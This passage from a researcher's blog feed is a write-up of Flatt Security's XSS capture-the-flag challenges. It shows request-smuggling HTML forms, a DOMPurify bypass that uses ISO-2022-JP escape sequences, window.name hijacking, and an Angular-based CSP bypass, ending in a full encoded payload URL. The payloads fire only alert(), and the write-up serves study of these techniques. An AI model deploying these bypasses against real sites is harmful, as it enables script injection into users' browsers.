    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">http</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s2">`GET /shirley HTTP/1.1\r\na:a\r\nX:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`</span><span class="p">;</span>
    <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">document.forms[0].submit()</span><span class="dl">'</span><span class="p">,</span><span class="mi">3000</span><span class="p">)</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/b777c493-76c8-41e2-b7a2-a04f34d9142a" alt="image" /></p>

<p>In the request logs on the server you can see , we have two requests. The second which is a GET request to the path <code class="language-plaintext highlighter-rouge">/shirley</code> is taken from the request body. So Indeed we can perform desync attack here. Interestingly by sending the same request two times (submit form twice), the second time the index page is loaded it will return the response of the request which was smuggled in the POST body. Thats why you see the <code class="language-plaintext highlighter-rouge">Path /shirley not found</code> reponse in the screenshot above</p>

<p>Btw just an example this how the connection would be close, now if you use the same poc it doesn’t shows only the POST request :</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">content_length</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Length</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">content_length</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">413</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Post is too large</span><span class="sh">'</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="n">close_connection</span> <span class="o">=</span> <span class="bp">True</span> <span class="o">//</span> <span class="n">I</span> <span class="n">added</span> <span class="n">this</span> <span class="n">line</span>
            <span class="k">return</span>
</code></pre></div></div>

<p>The server allows us to send POST request to any path, so we can make a POST request to the http://34.171.202.118/api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint with the smuggled request in the body which should contain the xss payload. Now when the same form is submitted two times, the next time a request to the    /api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint is made the response for this will be of the smuggled request which is nothing but the 404 page containing the xss payload.</p>

<p>The below submits the form two times with some time delays, also we are targetting the form to be submitted inside the iframe to make sure everything is carried in the same tab because we want the requests to have the same Connection IDs</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">name=</span><span class="s">"shirley"</span> <span class="na">style=</span><span class="s">"position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"</span> <span class="na">src=</span><span class="s">"http://34.171.202.118/?draft_id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://34.171.202.118/api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">enctype=</span><span class="s">"text/plain"</span> <span class="na">target=</span><span class="s">"shirley"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"http"</span><span class="nt">&gt;&lt;/textarea&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;script&gt;</span>

    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">http</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s2">`GET /&lt;textarea&gt;&lt;a/id="&lt;/textarea&gt;&lt;text/src='x'onmouseover='alert()'&gt;shirley"&gt; HTTP/1.1\r\na:a\r\nX:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`</span><span class="p">;</span>
    <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">document.forms[0].submit()</span><span class="dl">'</span><span class="p">,</span><span class="mi">3000</span><span class="p">)</span>
    <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">document.forms[0].submit()</span><span class="dl">'</span><span class="p">,</span><span class="mi">6000</span><span class="p">)</span>
    <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">frames[0].location.href="http://34.171.202.118/?draft_id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4"</span><span class="dl">'</span><span class="p">,</span><span class="mi">4000</span><span class="p">)</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>After submitting the form two times which hopefully poisons the response for the /api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint. we redirect the frame to the /?draft_id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint where the js code will take the <code class="language-plaintext highlighter-rouge">draft_id</code> parameter id and make a fetch call to /api/drafts?id= endpoint which will return <code class="language-plaintext highlighter-rouge">Path /xss payload not found</code> as the response which is what passed to the sanitizer then to the innerHTML sink</p>

<p>Later talking with my friend I got to know we can include more attributes to make it interaction afert  that ,  I noticed that just this is enough to bypass the sanitizer</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">sanitizeHtml</span><span class="p">(</span><span class="s2">`&lt;img/id/src/y onerror=alert()&gt;`</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">&lt;img src="" onerror="alert()"&gt;</span><span class="dl">'</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/569a7ea0-1974-4cab-b0be-96d806ae5f35" alt="image" /></p>

<hr />

<h1 id="challenge-3-by-kinugawamasato">Challenge 3 by @kinugawamasato</h1>

<p>Well at first , this challenge looked impossible no matter from what angle I look at it. I mean check the source everything looks really good, that’s all the relevant code for this challenge. The Dompurify config ensures we can’t use any attributes neither <code class="language-plaintext highlighter-rouge">data-*</code> nor <code class="language-plaintext highlighter-rouge">aria-*</code> which is then used to create a blob url and loaded inside an iframe??</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="kd">const</span> <span class="nx">sanitizedHtml</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="p">{</span> <span class="na">ALLOWED_ATTR</span><span class="p">:</span> <span class="p">[],</span> <span class="na">ALLOW_ARIA_ATTR</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">ALLOW_DATA_ATTR</span><span class="p">:</span> <span class="kc">false</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="nx">sanitizedHtml</span><span class="p">],</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blobURL</span> <span class="o">=</span> <span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
      <span class="nx">input</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">sanitizedHtml</span><span class="p">;</span>
      <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">blobURL</span><span class="p">,</span> <span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p>My friend told me if you look into what the author main area of work is you will soon realize what the challenge is about.
I then looked at the server used to setup the challenge site, it was Python <code class="language-plaintext highlighter-rouge">http.server</code> nothing fancy, when I paid attention to the response header I noticed that it’s <code class="language-plaintext highlighter-rouge">Content-Type: text/html</code> see no charset specified this was a good lead… because I knew from Masato’s blogpost he has done a lot of work on Charset based xss in the past and also recently there was a blogpost related to this from SonarSource plus Mizu also posted a tweet about it.</p>

<p>https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/
https://x.com/kevin_mizu/status/1812882499875319959</p>

<p><img src="https://github.com/user-attachments/assets/c0b654ba-7663-43aa-a20b-931d5b41c74b" alt="image" /></p>

<p>Mizu’s screenshot should be self explanatory, when there is no charset specified browser tries to be smart and it tries to guess the charset this is similar to the mime sniffing behaviour where browser tries to guess the Mime type in cases where no <code class="language-plaintext highlighter-rouge">Content-Type</code> header is specified at all.
The SonarSource blogpost explain all this very well so I would recommend reading it if you haven’t already</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"\x1b$B"</span><span class="nt">&gt;&lt;/a&gt;</span>\x1b(B<span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"&gt;&lt;img src=x onerror=alert(1)&gt;"</span><span class="nt">&gt;&lt;/a&gt;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">\x1b$B</code> , <code class="language-plaintext highlighter-rouge">\x1b(B</code> are both different escape sequences. You can look at the below diagram which is taken from the same SonarSource blogpost to understand what these escape sequences does</p>

<p><img src="https://github.com/user-attachments/assets/a5f30c3b-3c6d-4a1c-b2f6-1ad6e931b994" alt="image" /></p>

<p>In simple terms , consider the sequence <code class="language-plaintext highlighter-rouge">\x1b$B</code> lets you escape the <code class="language-plaintext highlighter-rouge">"</code> context of the id attribute by ignoring the next <code class="language-plaintext highlighter-rouge">"</code> occurence and by  using this  <code class="language-plaintext highlighter-rouge">\x1b(B</code> escape sequence we make the rest of the part treated as ASCII ,so the browser sees the <code class="language-plaintext highlighter-rouge">img</code> element with <code class="language-plaintext highlighter-rouge">onerror</code> attribute and happily gives us xss.</p>

<p>Coming back to our challenge, as in the Mizu’s tweet we can see it easily allows you bypass Dompurify ,we hide the xss vectors inside attribute. 
Scrolling through Masato’s old tweets my friend found this gold  https://x.com/kinugawamasato/status/1309937578443849730?s=46&amp;t=SSyMk5f3kBs791RxVEILAg
<img src="https://github.com/user-attachments/assets/05f0a6bc-af1a-4b15-a74c-71111817d651" alt="image" /></p>

<p>It’s about a Charset XSS bug in  Blob API due to the ignorance of the charset specified in the <code class="language-plaintext highlighter-rouge">type</code> key. This allowed Masato to do a similar xss as explained by Mizu and SonarSource.</p>

<p>Here’s poc fron the Chromium bug report:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="s2">`aaa\u001B$@&lt;textarea&gt;\u001B(B&lt;script&gt;alert('xss');alert(document.charset)&lt;\/script&gt;&lt;/textarea&gt;bbb`</span><span class="p">],</span> <span class="p">{</span>
          <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html;charset=utf-8</span><span class="dl">"</span><span class="c1">//this charset should be used</span>
        <span class="p">});</span>
        <span class="nx">location</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
</code></pre></div></div>

<p>You can see using the <code class="language-plaintext highlighter-rouge">type</code> option, the charset is defined there. But seems Chromium was ignoring it which led to such bypass:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa\u001B$@<span class="nt">&lt;textarea&gt;</span>\u001B(B<span class="nt">&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">xss</span><span class="dl">'</span><span class="p">);</span><span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">charset</span><span class="p">)</span><span class="o">&lt;</span><span class="err">\</span><span class="o">/</span><span class="nx">script</span><span class="o">&gt;&lt;</span><span class="sr">/textarea&gt;bb</span><span class="err">b
</span></code></pre></div></div>

<p>Funny enough we came across  <code class="language-plaintext highlighter-rouge">textarea</code> again in the 3rd challenge also, as already discussed content inside of textarea isn’t rendered by the browser so normally the script element should not be rendered.But due charset problem, using the escape sequences in ISO-2022-JP encoding we can make it to ignore the starting <code class="language-plaintext highlighter-rouge">textarea</code> element thus the <code class="language-plaintext highlighter-rouge">script</code> element is no longer inside <code class="language-plaintext highlighter-rouge">textarea</code>. This will allow the script element to be rendered and an alert will popup.</p>

<p>As the reported bug by Masato is fixed, Blob API now respects the charset specified in the <code class="language-plaintext highlighter-rouge">type</code> key. But still if you want to reproduce it you can omit the <code class="language-plaintext highlighter-rouge">charset</code> attribute and you can replicate the same which is expected to show weird behaviours as we are not specifying a charset:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="s2">`aaa\u001B$@&lt;textarea&gt;\u001B(B&lt;script&gt;alert('xss');alert(document.charset)&lt;\/script&gt;&lt;/textarea&gt;bbb`</span><span class="p">],</span> <span class="p">{</span>
          <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="c1">//this charset is removed</span>
        <span class="p">});</span>
        <span class="nx">location</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
</code></pre></div></div>

<p>This is how the element gets rendered and we also get the alert popup</p>

<p><img src="https://github.com/user-attachments/assets/926ccbc0-49f7-455f-a56b-ed774143ff3e" alt="image" /></p>

<p>This vector is special because it doesn’t makes the use of any attributes which is what we need for our challenge and if you pay attention in challenge site there also the charset isn’t specified for the Blob API</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="kd">const</span> <span class="nx">sanitizedHtml</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="p">{</span> <span class="na">ALLOWED_ATTR</span><span class="p">:</span> <span class="p">[],</span> <span class="na">ALLOW_ARIA_ATTR</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">ALLOW_DATA_ATTR</span><span class="p">:</span> <span class="kc">false</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="nx">sanitizedHtml</span><span class="p">],</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blobURL</span> <span class="o">=</span> <span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
      <span class="nx">input</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">sanitizedHtml</span><span class="p">;</span>
      <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">blobURL</span><span class="p">,</span> <span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/90e38ac5-7726-49a0-bda5-17b8f816ca10" alt="image" /></p>

<p>For style it’s even more strict removes the whole node, similar behaviour we can see for other possible options xmp,plaintext,title,etc</p>

<p><img src="https://github.com/user-attachments/assets/722253fc-a959-4f01-bcd9-02a4963226f1" alt="image" /></p>

<p>I was stuck here for a very long time and at one moment  I randomly started playing with just <code class="language-plaintext highlighter-rouge">&lt;</code>,<code class="language-plaintext highlighter-rouge">&gt;</code> inside of <code class="language-plaintext highlighter-rouge">style</code> element. That’s when I noticed that dompurify only removes the STYLE node upon encountering a closing or a starting element inside the STYLE contents.</p>

<p><img src="https://github.com/user-attachments/assets/70e4254c-0469-45b8-a88a-61215a91dfc6" alt="image" /></p>

<p>Now all I needed to do was find  a way to put something in place of the space after <code class="language-plaintext highlighter-rouge">&lt;</code> which would remain as it is during Dompurify sanitization process but when rendered by the browser it gets ignored so that it becomes <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> something like a NULL character.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa &lt;style&gt;\u001B(B  &lt; script&gt;alert('xss');alert(document.charset)&lt; /script&gt; &lt;/style&gt; bbb
</code></pre></div></div>

<p>I thought why not just use the escape sequence ? And yeah that turned out to be working so fucking well. This was passed as it is from Dompurify but when rendered by the browser, the script alement appeared as <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> not <code class="language-plaintext highlighter-rouge">&lt;SOMECHARACTERscript&gt;</code> so that was a good sign . I was testing in Firefox at that time and noticed that the same doesn’t works in Chrome</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa<span class="nt">&lt;style&gt;</span><span class="err">\</span><span class="nt">u001B</span><span class="o">(</span><span class="nt">Bsssss</span><span class="o">&lt;</span><span class="err">\</span><span class="nt">u001B</span><span class="o">(</span><span class="nt">Bscript</span><span class="o">&gt;</span><span class="nt">alert</span><span class="o">(</span><span class="s2">'xss'</span><span class="o">);</span><span class="nt">alert</span><span class="o">(</span><span class="nt">document</span><span class="nc">.charset</span><span class="o">)&lt;</span><span class="err">\</span><span class="nt">u001B</span><span class="o">(</span><span class="nt">B</span><span class="o">/</span><span class="nt">script</span><span class="o">&gt;</span><span class="nt">&lt;/style&gt;</span>bbb
</code></pre></div></div>

<p>Give it a try in ff then in chrome</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="s2">`aaa &lt;style&gt; \u001B(B&lt;\u001B(B/style&gt;&lt;\u001B(Bimg src=x onerror=alert()&gt; &lt;/style&gt; bbb`</span><span class="p">],</span> <span class="p">{</span>
          <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span> <span class="c1">//this charset should be used</span>
 <span class="p">});</span>
<span class="nx">location</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
</code></pre></div></div>

<p>Here in this screenshot you can see how both the browsers interpret this differently
<img src="https://github.com/user-attachments/assets/4b9fcb81-72c8-49fe-b806-2a2d81184767" alt="image" /></p>

<p>To make this work in Chrome, the solution is very simple we just need to add <code class="language-plaintext highlighter-rouge">\x1b$B</code> at the starting</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="s2">`aaa \x1b$B &lt;style&gt; \u001B(B&lt;\u001B(B/style&gt;&lt;\u001B(Bimg src=x onerror=alert()&gt; &lt;/style&gt; bbb`</span><span class="p">],</span> <span class="p">{</span>
          <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span> <span class="c1">//this charset should be used</span>
 <span class="p">});</span>
<span class="nx">location</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/3ae6f1b3-675c-4d4b-bec1-0846d165a390" alt="image" /></p>

<p>Still few more hurdles to solve, if you look at the poc we are using for Blob we are loading the blob url by making a redirect to it. This seems to be necessary we can even see a warning message in firefox when we load this vector in the challenge site. As the blob url is loaded inside an iframe.</p>

<p><em>The character encoding of a framed document was not declared. The document may appear different if viewed without the document framing it.</em></p>

<p><img src="https://github.com/user-attachments/assets/d7132215-3010-4918-948a-cc02064b1df4" alt="image" /></p>

<p>The blobUrl is loaded like this</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">name=</span><span class="s">"iframe"</span> <span class="na">style=</span><span class="s">"width: 80%;height:200px"</span><span class="nt">&gt;&lt;/iframe&gt;</span>

<span class="nt">&lt;script&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">blobURL</span><span class="p">,</span> <span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p>window.open targets the url to the iframe element with the name <code class="language-plaintext highlighter-rouge">iframe</code>. After thinking for a while I thought of trying window hijacking, basically the idea is setting the <code class="language-plaintext highlighter-rouge">window.name</code> property to <code class="language-plaintext highlighter-rouge">iframe</code>. So because of this the current top window has the name “iframe” when <code class="language-plaintext highlighter-rouge">window.open(blobURL, "iframe")</code> is executed instead of targetting the iframe it will target the current top window thus making a full redirect to the blobUrl instead of loading it inside the iframe which is what we wantttt.</p>

<p>In Chrome, even for different origins if the tab in which they are opened is same. They all will share the same <code class="language-plaintext highlighter-rouge">window.name</code> property ,this thing doesn’t works in Firefox.</p>

<p>I decided to host the following poc on my site:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
  <span class="kd">let</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
  <span class="nb">window</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">params</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">)</span>
  <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>And this worked, but now the only task left was to bypass CSP which was fairly easy, as cdnjs.cloudflare.com is in the allowlist we can load angular and bypass the csp completely.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>default-src 'none';script-src 'sha256-EojffqsgrDqc3mLbzy899xGTZN4StqzlstcSYu24doI=' cdnjs.cloudflare.com; style-src 'unsafe-inline'; frame-src blob:
</code></pre></div></div>

<p>This was the final payload which I came up with:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa\x1B$@<span class="nt">&lt;style&gt;</span><span class="err">\</span><span class="nt">x1B</span><span class="o">(</span><span class="nt">B</span><span class="o">&lt;</span><span class="err">\</span><span class="nt">x1B</span><span class="o">(</span><span class="nt">Bscript</span> <span class="nt">src</span><span class="o">=</span><span class="s1">"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js"</span><span class="o">&gt;&lt;</span><span class="err">\</span><span class="nt">x1B</span><span class="o">(</span><span class="nt">B</span><span class="o">/</span><span class="nt">script</span><span class="o">&gt;&lt;</span><span class="err">\</span><span class="nt">x1B</span><span class="o">(</span><span class="nt">Bimg</span><span class="o">/</span><span class="nt">ng-app</span><span class="o">/</span><span class="nt">ng-csp</span><span class="o">/</span><span class="nt">src</span><span class="o">/</span><span class="nt">ng-on-error</span><span class="o">=</span><span class="err">$</span><span class="nt">event</span><span class="nc">.target.ownerDocument.defaultView.alert</span><span class="o">(</span><span class="err">$</span><span class="nt">event</span><span class="nc">.target.ownerDocument.defaultView.origin</span><span class="o">)&gt;</span><span class="nt">&lt;/style&gt;</span>bbb
</code></pre></div></div>

<p>By opening this url you will get an alert on the challenge site ;)
https://sudistark.github.io/window-name-redirect.html?name=iframe#aHR0cHM6Ly9jaGFsbGVuZ2Uta2ludWdhd2EucXVpei5mbGF0dC50cmFpbmluZy8/aHRtbD1hYWElMUIkQCUzQ3N0eWxlJTNFJTFCKEIlM0MlMUIoQnNjcmlwdCUyMHNyYz0lMjJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9hbmd1bGFyLmpzLzEuOC4wL2FuZ3VsYXIuanMlMjIlM0UlM0MlMUIoQi9zY3JpcHQlM0UlM0MlMUIoQmltZy9uZy1hcHAvbmctY3NwL3NyYy9uZy1vbi1lcnJvcj0kZXZlbnQudGFyZ2V0Lm93bmVyRG9jdW1lbnQuZGVmYXVsdFZpZXcuYWxlcnQoJGV2ZW50LnRhcmdldC5vd25lckRvY3VtZW50LmRlZmF1bHRWaWV3Lm9yaWdpbiklM0UlM0Mvc3R5bGUlM0ViYmI=</p>

<p><img src="https://github.com/user-attachments/assets/be4f06b7-b270-47e1-b463-ef57aaaabc6c" alt="image" /></p>

<p>If you come this far reading this thankyou so much I hope you liked reading it and pardon if there are any mistakes lots of new stuff which I got to know during this timespan trying to solve this challenges only , thanks to Flatt Security for creating such awesome challenges I really learned a lot by trying to solve them.</p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><category term="bug-bounty" /><category term="csp" /><category term="xss-attack" /><summary type="html"><![CDATA[There were three xss challenges from Flatt Security , which were all really good I really liked the last challenge which was authored by the legend Masato Kinugawa and I managed to solve it too :p]]></summary></entry><entry><title type="html">Hey Everyoneeee</title><link href="http://localhost:4000/2024/12/01/hey-everyoneeee.html" rel="alternate" type="text/html" title="Hey Everyoneeee" /><published>2024-12-01T00:00:00+00:00</published><updated>2024-12-01T00:00:00+00:00</updated><id>http://localhost:4000/2024/12/01/hey-everyoneeee</id><content type="html" xml:base="http://localhost:4000/2024/12/01/hey-everyoneeee.html"><![CDATA[<p>shirley</p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><summary type="html"><![CDATA[shirley]]></summary></entry><entry><title type="html">Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN</title><link href="http://localhost:4000/2024/08/31/bypassing-csp-via-url-parser-confusions-xss-on-netlify-s-image-cdn.html" rel="alternate" type="text/html" title="Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN" /><published>2024-08-31T00:00:00+00:00</published><updated>2024-08-31T00:00:00+00:00</updated><id>http://localhost:4000/2024/08/31/bypassing-csp-via-url-parser-confusions-xss-on-netlify-s-image-cdn</id><content type="html" xml:base="http://localhost:4000/2024/08/31/bypassing-csp-via-url-parser-confusions-xss-on-netlify-s-image-cdn.html"><![CDATA[<h3>Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN</h3><p>Heyyy Everyonee,</p><p>In this blogpost I am going to talk about my finding which was a XSS on Netlify’s Image CDN used in <a 